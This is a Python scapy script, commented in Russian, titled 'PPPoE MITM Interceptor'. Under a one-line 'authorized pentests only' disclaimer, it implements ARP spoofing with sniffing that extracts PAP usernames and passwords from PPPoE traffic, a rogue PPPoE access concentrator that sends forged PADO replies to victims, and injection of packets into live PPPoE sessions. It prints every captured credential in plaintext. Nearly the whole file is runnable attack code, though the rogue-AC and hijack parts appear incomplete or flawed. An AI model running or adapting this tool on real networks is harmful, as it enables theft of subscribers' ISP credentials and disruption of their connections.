#!/usr/bin/env python3
"""
PPPoE MITM Interceptor
⚠️ ВНИМАНИЕ: Только для авторизованных пентестов
Назначение: MITM атака на PPPoE для перехвата MAC адресов и credentials
Методы: ARP spoofing, PPPoE rogue AC, Session hijacking

Использование:
python3 pppoe_mitm_interceptor.py --interface eth0 --target 192.168.0.1 --mode arp-spoof
python3 pppoe_mitm_interceptor.py --interface eth0 --mode rogue-ac --bras-mac 44:6A:2E:37:15:BE
python3 pppoe_mitm_interceptor.py --interface eth0 --mode session-hijack

Зависимости: pip install scapy

⚠️ LEGAL WARNING: Использование без авторизации незаконно
"""

from scapy.all import *
import threading
import time
import argparse
from collections import defaultdict

class PPPoEMITMInterceptor:
    def __init__(self, interface, target_ip=None, bras_mac=None):
        self.interface = interface
        self.target_ip = target_ip
        self.bras_mac = bras_mac
        self.intercepted_macs = defaultdict(dict)
        self.intercepted_credentials = []
        self.running = False
    
    def arp_spoofing(self):
        """ARP spoofing для MITM"""
        print("[*] Запуск ARP spoofing...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Interface: {self.interface}")
        
        self.running = True
        
        def spoof_thread():
            while self.running:
                try:
                    # ARP poison target
                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                 ARP(op=2, pdst=self.target_ip, psrc="192.168.0.254",
                                     hwdst="ff:ff:ff:ff:ff:ff", hwsrc=get_if_hwaddr(self.interface))
                    
                    sendp(arp_packet, iface=self.interface, verbose=0)
                    
                    # ARP poison gateway
                    gateway_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                    ARP(op=2, pdst="192.168.0.254", psrc=self.target_ip,
                                        hwdst="ff:ff:ff:ff:ff:ff", hwsrc=get_if_hwaddr(self.interface))
                    
                    sendp(gateway_arp, iface=self.interface, verbose=0)
                    
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"[-] ARP spoofing ошибка: {e}")
                    break
        
        # Запуск spoofing thread
        spoof_thread = threading.Thread(target=spoof_thread)
        spoof_thread.start()
        
        # Sniffing для перехвата PPPoE
        def packet_handler(packet):
            if not self.running:
                return
            
            # Перехват PPPoE discovery
            if packet.haslayer(PPPoE):
                pppoe = packet[PPPoE]
                src_mac = packet[Ether].src
                
                if pppoe.code == 0x09:  # PADI
                    self.intercepted_macs['PADI'][src_mac] = {
                        'timestamp': time.time(),
                        'ip': packet[IP].src if packet.haslayer(IP) else 'unknown'
                    }
                    print(f"[+] Перехвачен PADI от {src_mac}")
                
                elif pppoe.code == 0x19:  # PADR
                    self.intercepted_macs['PADR'][src_mac] = {
                        'timestamp': time.time(),
                        'ip': packet[IP].src if packet.haslayer(IP) else 'unknown'
                    }
                    print(f"[+] Перехвачен PADR от {src_mac}")
            
            # Перехват PPPoE authentication (PAP)
            elif packet.haslayer(PPP) and packet.haslayer(Raw):
                payload = bytes(packet[Raw])
                
                # Попытка извлечь credentials
                if b'\x01\x00' in payload:  # PAP authenticate
                    try:
                        # Попытка декодирования PAP
                        if len(payload) > 5:
                            username_len = payload[5]
                            if len(payload) > 5 + username_len:
                                username = payload[6:6+username_len].decode('utf-8', errors='ignore')
                                password_len = payload[6+username_len]
                                if len(payload) > 6+username_len+1+password_len:
                                    password = payload[6+username_len+1:6+username_len+1+password_len].decode('utf-8', errors='ignore')
                                    
                                    self.intercepted_credentials.append({
                                        'username': username,
                                        'password': password,
                                        'timestamp': time.time(),
                                        'src_mac': packet[Ether].src
                                    })
                                    print(f"[+] Перехвачены credentials: {username}:{password}")
                    except:
                        pass
        
        try:
            sniff(iface=self.interface, prn=packet_handler, store=False, timeout=300)
        except Exception as e:
            print(f"[-] Sniffing ошибка: {e}")
        
        self.running = False
        spoof_thread.join()
    
    def rogue_pppoe_ac(self):
        """Создание rogue PPPoE AC для перехвата credentials"""
        print("[*] Запуск rogue PPPoE AC...")
        print(f"[*] BRAS MAC: {self.bras_mac}")
        
        self.running = True
        
        def pado_responder():
            """Ответ на PADI поддельным PADO"""
            while self.running:
                try:
                    # Sniffing PADI packets
                    padi = sniff(iface=self.interface, filter="pppoed and pppoes code==0x09", 
                                timeout=2, count=1)
                    
                    if padi:
                        for packet in padi:
                            victim_mac = packet[Ether].src
                            
                            # Отправка поддельного PADO
                            pado = Ether(dst=victim_mac, src=get_if_hwaddr(self.interface)) / \
                                   PPPoE(version=1, type=1, code=0x07, sessionid=0x0000) / \
                                   PPPoETag(type=0x0103, length=len("ROGUE-BRAS")) / \
                                   "ROGUE-BRAS"
                            
                            sendp(pado, iface=self.interface, verbose=0)
                            
                            self.intercepted_macs['ROGUE-PADO'][victim_mac] = {
                                'timestamp': time.time(),
                                'rogue_ac': True
                            }
                            print(f"[+] Отправлен rogue PADO на {victim_mac}")
                
                except Exception as e:
                    continue
        
        # Запуск PADO responder
        pado_thread = threading.Thread(target=pado_responder)
        pado_thread.start()
        
        # Sniffing для PADR с credentials
        def padr_handler(packet):
            if not self.running:
                return
            
            if packet.haslayer(PPPoE) and packet[PPPoE].code == 0x19:  # PADR
                victim_mac = packet[Ether].src
                self.intercepted_macs['PADR'][victim_mac] = {
                    'timestamp': time.time(),
                    'rogue_ac': True
                }
                print(f"[+] Перехвачен PADR от {victim_mac} (к rogue AC)")
        
        try:
            sniff(iface=self.interface, prn=padr_handler, store=False, timeout=300)
        except Exception as e:
            print(f"[-] Sniffing ошибка: {e}")
        
        self.running = False
        pado_thread.join()
    
    def session_hijacking(self):
        """Hijacking PPPoE сессий"""
        print("[*] Запуск PPPoE session hijacking...")
        
        self.running = True
        
        def hijack_handler(packet):
            if not self.running:
                return
            
            # Попытка предсказания session ID
            if packet.haslayer(PPPoE):
                pppoe = packet[PPPoE]
                
                if pppoe.code == 0x00:  # PPPoE session data
                    session_id = pppoe.sessionid
                    src_mac = packet[Ether].src
                    
                    self.intercepted_macs['SESSION'][src_mac] = {
                        'session_id': session_id,
                        'timestamp': time.time()
                    }
                    print(f"[+] Session ID: {session_id} от {src_mac}")
                    
                    # Попытка hijack
                    hijack_packet = Ether(dst=src_mac) / \
                                     PPPoE(version=1, type=1, code=0x00, sessionid=session_id) / \
                                     PPPoETag(type=0x0101, length=0)
                    
                    sendp(hijack_packet, iface=self.interface, verbose=0)
        
        try:
            sniff(iface=self.interface, prn=hijack_handler, store=False, timeout=300)
        except Exception as e:
            print(f"[-] Hijacking ошибка: {e}")
        
        self.running = False
    
    def generate_report(self):
        """Генерация отчета"""
        print("\n" + "="*60)
        print("ОТЧЕТ PPPoE MITM INTERCEPTION")
        print("="*60)
        
        total_macs = 0
        unique_macs = set()
        
        for source, macs in self.intercepted_macs.items():
            if macs:
                print(f"\n[{source.upper()}] - {len(macs)} MAC адресов:")
                print("-" * 60)
                for mac, info in macs.items():
                    unique_macs.add(mac)
                    total_macs += 1
                    print(f"  MAC: {mac}")
                    for key, value in info.items():
                        print(f"    {key}: {value}")
        
        if self.intercepted_credentials:
            print(f"\n[PEREHVATCHENNYE CREDENTIALS] - {len(self.intercepted_credentials)}:")
            print("-" * 60)
            for cred in self.intercepted_credentials:
                print(f"  Username: {cred['username']}")
                print(f"  Password: {cred['password']}")
                print(f"  MAC: {cred['src_mac']}")
                print(f"  Timestamp: {cred['timestamp']}")
        
        print("\n" + "="*60)
        print(f"Всего MAC адресов: {total_macs}")
        print(f"Уникальных MAC адресов: {len(unique_macs)}")
        print(f"Перехвачено credentials: {len(self.intercepted_credentials)}")
        print("="*60)
        
        return {
            'total_macs': total_macs,
            'unique_macs': len(unique_macs),
            'credentials': len(self.intercepted_credentials),
            'macs': dict(self.intercepted_macs)
        }

def main():
    parser = argparse.ArgumentParser(description='PPPoE MITM Interceptor')
    parser.add_argument('--interface', required=True, help='Network interface')
    parser.add_argument('--target', help='Target IP for ARP spoofing')
    parser.add_argument('--bras-mac', help='BRAS MAC for rogue AC')
    parser.add_argument('--mode', choices=['arp-spoof', 'rogue-ac', 'session-hijack'],
                       required=True, help='MITM mode')
    
    args = parser.parse_args()
    
    print("[*] PPPoE MITM Interceptor")
    print(f"[*] Interface: {args.interface}")
    print(f"[*] Mode: {args.mode}")
    print("[*] ⚠️  Только для авторизованных пентестов")
    
    interceptor = PPPoEMITMInterceptor(args.interface, args.target, args.bras_mac)
    
    if args.mode == 'arp-spoof':
        if not args.target:
            print("[-] Требуется --target для ARP spoofing")
            return
        interceptor.arp_spoofing()
    elif args.mode == 'rogue-ac':
        if not args.bras_mac:
            print("[-] Требуется --bras-mac для rogue AC")
            return
        interceptor.rogue_pppoe_ac()
    elif args.mode == 'session-hijack':
        interceptor.session_hijacking()
    
    interceptor.generate_report()

if __name__ == "__main__":
    main()
